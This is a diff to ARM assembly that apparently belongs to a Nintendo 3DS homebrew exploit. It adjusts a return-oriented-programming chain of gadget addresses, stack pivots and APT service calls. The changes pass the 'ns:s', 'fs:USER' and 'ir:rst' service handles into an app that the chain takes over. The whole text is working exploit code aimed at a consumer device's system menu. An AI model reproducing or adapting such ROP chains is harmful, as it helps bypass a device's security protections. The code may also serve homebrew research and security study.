@@ -150,18 +150,20 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	sleep 100*1000, 0x00000000
 	apt_open_session 1
 	apt_glance_parameter app_id, DUMMY_PTR, 0x0, DUMMY_PTR, 1
-	apt_close_session 1
 	; compare to 0x0 value
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word 0x00000000
 	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
-	; overwrite stack pivot with NOP if equal
+	; overwrite stack pivot with NOP if not equal
 	.word ROP_MENU_POP_R4PC
 		.word MENU_NOP
 	.word ROP_MENU_POP_R0PC
 		.word MENU_OBJECT_LOC + @@loop_pivot - 0x4
 	.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	apt_close_session 1 ; can't close earlier because need to maintain r0 and flags
+	.word ROP_MENU_POP_R4PC
 		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
 	@@loop_pivot:
 	.word ROP_MENU_STACK_PIVOT
@@ -223,7 +225,7 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 
 		; send app parameter
 			apt_open_session 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR, 0x20, MENU_FS_HANDLE
+			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + fsUserString, 0x8, MENU_FS_HANDLE
 			apt_close_session 0
 
 		; launch app that we want to takeover
@@ -239,12 +241,18 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 		; release gsp rights
 			gsp_release_right
 
-			wait_for_parameter 0x101
-
-			sleep 500*1000*1000, 0x00000000
+			; wait_for_parameter 0x101
+			sleep 400*1000*1000, 0x00000000
 
 			apt_open_session 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR, 0x20, MENU_NSS_HANDLE
+			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + nssString, 0x8, MENU_NSS_HANDLE
+			apt_close_session 0
+
+			; wait_for_parameter 0x101
+			sleep 400*1000*1000, 0x00000000
+
+			apt_open_session 0
+			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + irrstString, 0x8, MENU_IRRST_HANDLE
 			apt_close_session 0
 
 		; sleep for ever and ever
@@ -277,6 +285,21 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 		.word 0xFFFFFFFF ; dim out
 		.word 0x00000008 ; flags
 		.word 0x00000000 ; unused
+
+	nssString:
+		.ascii "ns:s"
+		.byte 0x00
+		.byte 0x00
+		.byte 0x00
+		.byte 0x00
+		.byte 0x00
+	fsUserString:
+		.ascii "fs:USER"
+		.byte 0x00
+	irrstString:
+		.ascii "ir:rst"
+		.byte 0x00
+		.byte 0x00
 
 	.align 0x20
 	appHook:
